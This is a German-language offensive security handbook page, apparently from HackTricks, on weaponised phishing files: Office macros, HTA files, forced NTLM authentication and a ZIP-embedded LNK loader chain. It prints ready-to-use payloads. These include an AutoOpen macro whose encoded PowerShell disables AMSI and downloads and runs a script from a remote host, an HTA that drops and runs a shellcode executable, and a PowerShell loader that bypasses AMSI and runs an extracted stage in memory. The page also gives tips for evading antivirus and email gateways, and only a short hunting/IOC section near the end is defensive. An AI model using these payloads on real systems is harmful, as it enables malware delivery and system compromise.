# Phishing Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt eine Validierung der Datei-Daten durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifikation der Datenstrukturen gemäß dem OfficeOpenXML-Standard. Falls während der Identifikation der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

In der Regel verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem man die Dateiendung ändert, und dennoch ihre Fähigkeit zur Ausführung von Makros beizubehalten.\
Zum Beispiel unterstützt eine RTF-Datei von vornherein keine Makros, aber eine als RTF umbenannte DOCM-Datei wird von Microsoft Word behandelt und kann Makros ausführen.\
Die gleichen Interna und Mechanismen gelten für alle Software der Microsoft Office Suite (Excel, PowerPoint etc.).

Sie können den folgenden Befehl verwenden, um zu prüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine Remote-Vorlage verweisen (File –Options –Add-ins –Manage: Templates –Go) und macros enthalten, können macros ebenfalls “ausführen”.

### Externes Laden von Bildern

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Kategorien**: Links and References, **Feldnamen**: includePicture, und **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Es ist möglich, macros zu verwenden, um arbitrary code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie sind, desto wahrscheinlicher erkennt AV sie.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **Datei > Info > Dokument prüfen > Dokument prüfen**, wodurch der Dokumentinspektor geöffnet wird. Klicke **Prüfen** und dann **Alle entfernen** neben **Dokumenteigenschaften und persönliche Informationen**.

#### DOC-Erweiterung

Wenn fertig, wähle das Dropdown **Speichern als Typ**, ändere das Format von **`.docx`** zu **Word 97-2003 `.doc`**.\
Mach das, weil du **keine Makros in einer `.docx` speichern kannst** und es ein **Stigma** gegenüber der macro-enabled **`.docm`** Erweiterung gibt (z. B. das Thumbnail-Symbol hat ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **legacy `.doc` Erweiterung der beste Kompromiss**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript)** kombiniert. Sie erzeugt die Benutzeroberfläche und wird als eine "voll vertrauenswürdige" Anwendung ausgeführt, ohne die Beschränkungen des Sicherheitsmodells eines Browsers.

Eine HTA wird mittels **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installiert** ist, wodurch **`mshta` von IE abhängig** ist. Wenn dieser deinstalliert wurde, können HTAs nicht mehr ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Erzwingen von NTLM-Authentifizierung

Es gibt mehrere Möglichkeiten, die **NTLM-Authentifizierung "aus der Ferne"** zu erzwingen, zum Beispiel durch das Einfügen von **unsichtbaren Bildern** in E-Mails oder HTML, auf die der Benutzer zugreift (sogar HTTP MitM?). Oder indem man dem Opfer die **Adresse von Dateien** schickt, die allein durch das **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Siehe diese Ideen und mehr auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Nicht vergessen: man kann nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM relay attacks** durchführen:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hochwirksame Kampagnen liefern ein ZIP, das zwei legitime Köderdokumente (PDF/DOCX) und eine bösartige .lnk enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader in den rohen Bytes des ZIP nach einem eindeutigen Marker gespeichert ist, und die .lnk diesen vollständig im Speicher extrahiert und ausführt.

Typischer Ablauf, implementiert durch den .lnk PowerShell-Einzeiler:

1) Finde das originale ZIP in gängigen Pfaden: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und dem übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.  
2) Lese die ZIP-Bytes und finde einen hardcodierten Marker (z.B. xFIQCV). Alles nach dem Marker ist das eingebettete PowerShell-Payload.  
3) Kopiere das ZIP nach %ProgramData%, entpacke es dort und öffne die Köder-.docx, um legitim zu wirken.  
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Die nächste Stufe deobfuskieren (z.B. alle #-Zeichen entfernen) und sie im Speicher ausführen.

Beispiel eines PowerShell-Skeletts, um die eingebettete Stufe zu extrahieren und auszuführen:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Die Zustellung missbraucht häufig vertrauenswürdige PaaS-Subdomains (z. B. *.herokuapp.com) und kann payloads einschränken (liefert harmlose ZIPs basierend auf IP/UA).
- Die nächste Stufe entschlüsselt häufig base64/XOR shellcode und führt ihn via Reflection.Emit + VirtualAlloc aus, um Festplattenartefakte zu minimieren.

Persistence, die in derselben Kette eingesetzt wird
- COM TypeLib hijacking des Microsoft Web Browser control, sodass IE/Explorer oder jede App, die es einbettet, den payload automatisch neu startet. Details und einsatzbereite Befehle hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die den ASCII marker string (z. B. xFIQCV) enthalten, der an die Archivdaten angehängt wurde.
- .lnk, das übergeordnete/Benutzerordner auflistet, um das ZIP zu finden und ein Köderdokument zu öffnen.
- AMSI-Manipulation via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang laufende Business-Threads, die mit Links enden, die unter vertrauenswürdigen PaaS-Domains gehostet werden.

## Referenzen

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
